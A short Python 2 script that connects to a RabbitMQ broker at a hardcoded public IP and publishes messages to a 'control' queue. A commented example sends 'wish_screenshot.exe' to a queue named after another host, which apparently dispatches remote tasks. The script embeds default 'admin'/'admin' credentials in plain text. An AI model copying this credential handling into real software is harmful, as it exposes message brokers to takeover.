#!/usr/bin/env python
# coding=utf8
import pika
import uuid
# Rabbitmq Connection Info
RABBITMQ = {
    'hostname': '106.14.125.45',
    'port': 5672,
    'username': 'admin',
    'password': 'admin',
    # 'username': 'guest',
    # 'password': 'guest',
}


class Center(object):
    def __init__(self):
        credentials = pika.PlainCredentials(RABBITMQ['username'], RABBITMQ['password'])
        self.parameters = pika.ConnectionParameters(RABBITMQ['hostname'], RABBITMQ['port'], '/', credentials)
        self.connection = pika.BlockingConnection(self.parameters)

        self.channel = self.connection.channel()


        result = self.channel.queue_declare(exclusive=True)

    def callback(self, n, control_queue):

        self.channel.basic_publish(exchange='',routing_key=control_queue,body=n)
    def closechannel(self):
        self.connection.close()

'''
center = Center()
print " [x] Requesting increase(30)"
response = center.callback('wish_screenshot.exe', '139.196.182.150')
print response
'''